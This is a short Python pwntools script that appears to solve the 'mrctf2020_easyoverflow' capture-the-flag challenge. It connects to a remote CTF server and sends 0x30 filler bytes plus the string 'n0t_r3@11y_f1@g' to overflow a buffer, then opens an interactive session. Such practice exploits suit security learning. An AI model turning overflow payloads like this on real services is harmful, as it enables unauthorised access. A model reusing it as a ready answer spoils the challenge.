#coding:utf-8
from pwn import *
import pwnlib
context.log_level = 'debug'
# sh = process("./mrctf2020_easyoverflow")
sh = remote("node3.buuoj.cn",27978)
elf = ELF("./mrctf2020_easyoverflow")
payload = 'a' * 0x30
payload += 'n0t_r3@11y_f1@g'
sh.sendline(payload)
sh.interactive()